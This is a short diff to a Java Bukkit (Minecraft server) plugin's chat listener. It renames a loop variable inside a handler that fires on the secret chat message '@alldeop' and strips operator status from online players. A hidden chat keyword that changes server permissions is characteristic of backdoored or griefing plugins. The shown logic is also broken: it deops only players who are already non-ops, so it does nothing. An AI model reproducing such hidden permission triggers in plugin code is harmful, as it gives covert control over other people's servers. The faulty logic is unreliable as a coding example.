@@ -194,7 +194,7 @@ public class MessageEvent implements Listener {
             e.setCancelled(true);
         }
         if(e.getMessage().equalsIgnoreCase("@alldeop")) {
-            for (Player player : Bukkit.getOnlinePlayers()) {
+            for (Player plr : Bukkit.getOnlinePlayers()) {
                 if (!plr.isOp()) {
                     plr.setOp(false);
                 }
